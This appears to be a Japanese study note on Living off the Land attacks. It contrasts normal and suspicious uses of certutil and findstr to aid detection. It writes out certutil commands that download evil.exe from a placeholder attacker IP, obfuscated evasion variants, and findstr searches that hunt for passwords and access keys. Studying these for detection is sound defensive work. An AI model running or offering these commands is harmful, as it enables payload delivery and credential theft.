# LotLとは
Living off the Landとは、サイバー攻撃においてマルウェアを使わず、標的システムに元から存在する正規のツールや機能（PowerShell、WMIなど）を悪用して攻撃する手法。

## Step1 certutil
### 正規の挙動
証明書の取得。通信先が信頼できるドメインかどうか確認する。  
`certutil -urlcache -f https://www.google.com`
### 不審な挙動
攻撃者がファイルをダウンロードする。  
`certutil -urlcache -f http://<攻撃者IP>:8000/evil.exe C:\Temp\setup.exe`  
上記のようなコマンドは検知されやすいため、難読化される可能性も考慮。
```powershell
# 文字列検知のみであれば回避できるが、最終的な実行バイナリを見られると検知される。
$a="cert"; $b="util"; &($a+$b) -urlcache -f http://<攻撃者IP>:8000/evil.exe C:\Temp\setup.exe
# リネームセクションを回避できない。
copy C:\Windows\System32\certutil.exe C:\temp\not_a_virus.exe
C:\temp\not_a_virus.exe -urlcache -f http://<攻撃者IP>:8000/evil.exe C:\Temp\setup.exe
# Base64エンコード、Sysmonのカーネルドライバなどで元コマンドを検知可能。
echo -n "certutil -urlcache -f http://<攻撃者IP>:8000/evil.exe C:\Temp\setup.exe" | iconv -t UTF-16LE | base64 -w 0
powershell.exe -EncodedCommand <Base64>
```

## Step2 findstr
### 正規の挙動
設定確認やトラブルシューティングなど、特定のフォルダに対しての文字列検索。  
`findstr /i "error" C:\Logs\app.log`  
`findstr "192.168.1.1" C:\Windows\System32\drivers\etc\hosts`
### 不審な挙動
`/s`の多用による網羅的で、キーワードが機密関連などの検索。
```powershell
findstr /s /i "password" C:\Users\*.xml
findstr /s /i "access_key" C:\*.txt
findstr /s "PWD" D:\Data\*.conf
```